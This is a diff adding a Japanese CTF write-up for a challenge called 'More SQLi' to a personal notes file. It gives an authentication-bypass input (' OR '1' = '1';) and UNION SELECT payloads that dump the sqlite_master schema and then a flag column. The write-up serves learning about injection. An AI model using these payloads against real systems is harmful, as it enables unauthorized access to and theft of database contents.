@@ -43,7 +43,8 @@
 [Some Assembly Required 2](#some-assembly-required-2)  
 [Sanity Check Round 44](#sanity-check-round-44)  
 [kaiser](#kaiser)  
-[Sleepy](#sleepy)
+[Sleepy](#sleepy)  
+[More SQLi](#more-sqli)
 
 # 解いた問題
 
@@ -571,3 +572,34 @@ imaginaryCTF
 ## 学び
 
 特になし
+
+## More SQLi
+
+## 解き方
+
+ログイン画面が表示されて適当に入力すると sql が表示される。
+
+```
+username: a
+password: a
+SQL query: SELECT id FROM users WHERE password = 'a' AND username = 'a'
+```
+
+今回の sql は password が先にあるため password に ' OR '1' = '1'; と入力するとログインできる。  
+次は検索画面バーが表示されるのでどんなテーブルがあるかの情報を得るために次の sql を使う。sql の出力が 3 列じゃないと表示されないので NULL を使って 3 列にする。
+
+```
+' UNION SELECT group_concat(sql), NULL, NULL FROM sqlite_master;
+```
+
+この結果から more_table っていう table に flag という列があるためそれを取得する。
+
+```
+' UNION SELECT flag, NULL, NULL FROM more_table;
+```
+
+## 学び
+
+- sql インジェクションでテーブルの情報を取得できる
+- 列の数が合わなかったら NULL で埋めれば良い
+- https://blog.hamayanhamayan.com/entry/2021/12/05/115923 このサイトに sql インジェクションの例がいっぱい載ってて良い
